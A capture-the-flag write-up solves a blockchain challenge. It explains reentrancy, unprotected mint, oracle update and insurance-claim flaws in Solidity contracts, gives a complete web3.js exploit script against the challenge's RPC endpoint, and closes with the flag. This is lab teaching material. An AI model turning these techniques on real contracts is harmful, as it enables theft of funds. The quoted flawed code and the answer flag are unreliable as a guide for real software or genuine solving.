# Writeup: Break The Chain - Blockchain Havoc

## Challenge Overview
- **Category:** Blockchain
- **Difficulty:** Medium-Hard
- **Objective:** Exploit multiple vulnerabilities across a suite of interconnected smart contracts (LendingPlatform, Token, Oracle, Insurance) to satisfy the win condition in the `Setup` contract.

## Vulnerability Analysis

### 1. LendingPlatform.sol: Reentrancy
The `withdraw` function in `LendingPlatform.sol` is classically vulnerable to reentrancy. It uses `msg.sender.call{value: amount}("")` to send Ether *before* updating the user's balance.

```solidity
function withdraw(uint256 amount) public {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    (bool success, ) = msg.sender.call{value: amount}(""); // External call before state update
    require(success, "Transfer failed");

    unchecked {
        balances[msg.sender] -= amount;
    }
}
```

**Exploit:**
Create a malicious contract that calls `withdraw()` recursively inside its `receive()` function. This allow us to drain the contract's entire balance (50 ETH) by repeatedly entering the `withdraw` function before the original balance is deducted.

### 2. Token.sol: Unprotected Mint
The `Token` contract provides an unprotected `mint` function with no access control.

```solidity
function mint(address to, uint256 amount) public {
    unchecked {
        balances[to] += amount;
        totalSupply += amount;
    }
}
```

**Exploit:**
Any user can call `mint()` to credit themselves with an arbitrary amount of tokens. We simply mint 2,000,000 tokens to exceed the required 1,000,000.

### 3. Oracle.sol: Unprotected Data Update
The `Oracle` contract allows any user to update the data for any address via the `updateData` function.

```solidity
function updateData(address user, uint256 value) public {
    data[user] = value;
}
```

**Exploit:**
Call `updateData(player, 1337)` to satisfy the `Setup` requirement.

### 4. Insurance.sol: Logic Flaw (Unprotected Issue & Claim)
Both `issuePolicy` and `claim` are unprotected and don't verify if the caller is authorized or has paid for the policy.

```solidity
function issuePolicy(address user) public {
    require(!policies[user], "Policy already exists");
    policies[user] = true;
}

function claim(address user) public {
    require(policies[user], "No policy exists");
    require(claims[user] == 0, "Claim already settled");
    claims[user] = 1000;
}
```

**Exploit:**
1. Call `issuePolicy(player)`.
2. Call `claim(player)`.

## Full Exploit Implementation

The following JavaScript script (`exploit.js`) automates the entire process:

```javascript
const Web3 = require('web3');
const fs = require('fs');
const path = require('path');

const SETUP_ADDRESS = process.argv[2]; 
const RPC_URL = 'http://havoc.breachpoint.live:8545/';

const web3 = new Web3(RPC_URL);

// Load compiled contract artifacts
const artifactsDir = path.join(__dirname, 'challenge/build/contracts');

function loadContract(name) {
    const artifact = JSON.parse(fs.readFileSync(path.join(artifactsDir, `${name}.json`), 'utf8'));
    return { abi: artifact.abi, bytecode: artifact.bytecode };
}

const setupContract = loadContract('Setup');
const tokenContract = loadContract('Token');
const oracleContract = loadContract('Oracle');
const insuranceContract = loadContract('Insurance');
const reentrancyContract = loadContract('ReentrancyAttack');

async function exploit() {
    const accounts = await web3.eth.getAccounts();
    const player = accounts[1];
    
    const setup = new web3.eth.Contract(setupContract.abi, SETUP_ADDRESS);
    
    const tokenAddr = await setup.methods.token().call();
    const oracleAddr = await setup.methods.oracle().call();
    const insuranceAddr = await setup.methods.insurance().call();
    const lendingAddr = await setup.methods.lending().call();
    
    const token = new web3.eth.Contract(tokenContract.abi, tokenAddr);
    const oracle = new web3.eth.Contract(oracleContract.abi, oracleAddr);
    const insurance = new web3.eth.Contract(insuranceContract.abi, insuranceAddr);
    
    // 1. Unprotected Mint
    await token.methods.mint(player, 2000000).send({ from: player, gas: 3000000 });
    
    // 2. Unprotected Oracle Update
    await oracle.methods.updateData(player, 1337).send({ from: player, gas: 3000000 });
    
    // 3. Unprotected Insurance Claim
    await insurance.methods.issuePolicy(player).send({ from: player, gas: 3000000 });
    await insurance.methods.claim(player).send({ from: player, gas: 3000000 });
    
    // 4. Reentrancy Attack
    const ReentrancyAttack = new web3.eth.Contract(reentrancyContract.abi);
    const attackContract = await ReentrancyAttack.deploy({
        data: reentrancyContract.bytecode,
        arguments: [lendingAddr]
    }).send({ from: player, gas: 3000000 });
    
    await attackContract.methods.attack().send({
        from: player,
        value: web3.utils.toWei('1', 'ether'),
        gas: 3000000
    });

    const isSolved = await setup.methods.isSolved().call();
    console.log(`Challenge Solved: ${isSolved}`);
}

exploit().catch(console.error);
```

## Flag
`bpctf{blockchain_havoc_dismantled}`
